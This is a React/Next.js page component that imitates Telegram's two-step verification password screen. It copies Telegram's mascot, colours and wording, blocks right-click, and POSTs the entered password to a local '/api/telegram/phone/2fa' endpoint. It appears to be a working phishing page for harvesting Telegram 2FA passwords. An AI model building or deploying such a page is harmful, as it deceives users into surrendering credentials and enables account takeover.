"use client";

import { useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";

export default function PasswordPage() {
  useEffect(() => {
    const handleContextMenu = (e) => e.preventDefault(); // disable right-click
    document.addEventListener("contextmenu", handleContextMenu);
    return () => {
      document.removeEventListener("contextmenu", handleContextMenu);
    };
  }, []);
  const router = useRouter();

  // 🐵 assets (put them in /public and use absolute paths for reliability)
  const closedImageSrc = "/monkey-face-hide.gif"; // animated (eyes covered)
  const openImageSrc = "/monkey-open.png"; // static (eyes open)
  const AFTER_GIF = "/monkey-face-stop.png"; // ⬅️ shown AFTER the GIF plays once

  const gifDurationMs = 1800;

  const [showPwd, setShowPwd] = useState(false);
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [err, setErr] = useState("");

  // Play closed GIF only once on initial mount, then show AFTER_GIF
  const [playedOnce, setPlayedOnce] = useState(false);

  useEffect(() => {
    const t = setTimeout(() => setPlayedOnce(true), gifDurationMs);
    return () => clearTimeout(t);
  }, [gifDurationMs]);

  // Pick the image:
  // - showPwd = true  => openImageSrc
  // - showPwd = false => GIF until it has "played once", then AFTER_GIF
  const currentImg = useMemo(() => {
    if (showPwd) return openImageSrc;
    return playedOnce ? AFTER_GIF || closedImageSrc : closedImageSrc;
  }, [showPwd, playedOnce, openImageSrc, closedImageSrc, AFTER_GIF]);

  async function onSubmit(e) {
    e.preventDefault();
    if (!password.trim() || loading) return;
    setLoading(true);
    setErr("");

    try {
      const res = await fetch("/api/telegram/phone/2fa", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password }),
      });

      const data = await res.json().catch(() => ({}));
      if (res.ok && data?.ok) {
        router.push("/welcome");
      } else {
        setErr(data?.error || "Invalid password");
      }
    } catch (e) {
      setErr("Network error. Please try again.");
    } finally {
      setLoading(false);
    }
  }

  return (
    <main className="min-h-screen bg-white flex items-center justify-center p-6">
      {/* fixed-width container like Telegram */}
      <div className="w-[360px] sm:w-[380px] flex flex-col items-center text-center">
        {/* 🐵 Monkey GIF / image */}
        <div
          className="w-[140px] h-[140px] bg-center bg-no-repeat bg-contain"
          style={{ backgroundImage: `url(${currentImg})` }}
          aria-label="Mascot"
        />

        {/* Title */}
        <h1 className="mt-4 text-[32px] font-semibold leading-tight dark:text-gray-900">
          Enter Password
        </h1>

        {/* Subtitle */}
        <p className="mt-3 text-[15px] leading-[22px] text-gray-600 ">
          You have Two-Step Verification enabled, so your account is protected
          with an additional password.
        </p>

        {/* Password input + eye toggle */}
        <form className="w-full mt-6" onSubmit={onSubmit}>
          <div className="relative w-full">
            <input
              type={showPwd ? "text" : "password"}
              placeholder=""
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="
                w-full h-12 rounded-[14px]
                border border-gray-300 bg-white
                pl-4 pr-12
                text-[15px] text-gray-900
                placeholder:text-gray-400
                shadow-sm
                outline-none
                focus:border-[#3390EC]
                focus:ring-2 focus:ring-[#3390EC]/30
              "
            />

            {/* Eye button */}
            <button
              type="button"
              onClick={() => setShowPwd((prev) => !prev)}
              aria-label={showPwd ? "Hide password" : "Show password"}
              className="
                absolute right-2 top-1/2 -translate-y-1/2
                h-8 w-8 grid place-items-center
                rounded-md text-gray-500
                hover:bg-gray-100 hover:shadow-sm
                focus:outline-none focus:ring-2 focus:ring-[#3390EC]/30
              "
            >
              {showPwd ? (
                // 👁️ Eye-off (hide)
                <svg
                  viewBox="0 0 24 24"
                  className="h-5 w-5"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <path d="M17.94 17.94A10.94 10.94 0 0 1 12 20c-7 0-10-8-10-8a21.8 21.8 0 0 1 5.06-6.94" />
                  <path d="M1 1l22 22" />
                  <path d="M9.88 9.88A3 3 0 0 0 12 15a3 3 0 0 0 2.12-.88" />
                </svg>
              ) : (
                // 👁️ Eye (show)
                <svg
                  viewBox="0 0 24 24"
                  className="h-5 w-5"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <path d="M1 12s3-8 11-8 11 8 11 8-3 8-11 8S1 12 1 12Z" />
                  <circle cx="12" cy="12" r="3" />
                </svg>
              )}
            </button>
          </div>

          {/* Error */}
          {err ? <div className="mt-3 text-sm text-red-600">{err}</div> : null}

          {/* NEXT button with spinner */}
          <button
            type="submit"
            disabled={loading || !password.trim()}
            aria-busy={loading}
            className="
              w-full mt-6 h-12 rounded-[14px]
              bg-[#3390EC] text-white font-semibold uppercase tracking-wide
              transition hover:bg-[#2b7cd7]
              focus:outline-none focus:ring-2 focus:ring-[#3390EC]/40
              disabled:opacity-60 disabled:cursor-not-allowed
              inline-flex items-center justify-center
            "
          >
            {loading ? (
              <span className="inline-flex items-center gap-2">
                <span
                  className="w-4 h-4 rounded-full border-2 border-white/40 border-t-white animate-spin"
                  aria-hidden="true"
                />
                Verifying…
              </span>
            ) : (
              "Next"
            )}
          </button>
        </form>
      </div>
    </main>
  );
}
